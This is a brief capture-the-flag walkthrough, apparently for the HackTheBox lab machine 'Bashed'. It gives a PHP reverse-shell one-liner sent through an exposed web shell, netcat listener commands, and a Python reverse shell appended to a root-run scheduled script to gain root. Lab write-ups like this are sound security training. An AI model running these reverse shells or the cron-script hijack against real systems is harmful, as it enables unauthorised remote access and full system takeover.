## Initial Exploit - 
***
The page at **http://10.129.84.164/dev/phpbash.php** will execute php commands supplied by the user. Set up a listener:  
> sudo nc -lvnp 80

Send a reverse shell:  
> php -r '$sock=fsockopen("10.10.16.16",80);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

The shell returns as www-data.

<div style="page-break-after: always;"></div>

## Privilege Escalation - 
***
www-data can run any command as the user scriptmanager. Spawn a shell as scriptmanager:  
> sudo -u scriptmanager /bin/bash

The scriptmanager user owns the script **/scripts/test.py** that root executes every minute. Add a shell to the file:  
```
import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.16",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```
![](/home/kali/Walkthroughs/HackTheBox/bashed/images/priv.png)

Set up a listener:  
> sudo nc -lvnp 80

The shell returns as root.

<div style="page-break-after: always;"></div>

## Proof - 
***
### User:

![](/home/kali/Walkthroughs/HackTheBox/bashed/images/user.png)

### Root:

![](/home/kali/Walkthroughs/HackTheBox/bashed/images/root.png)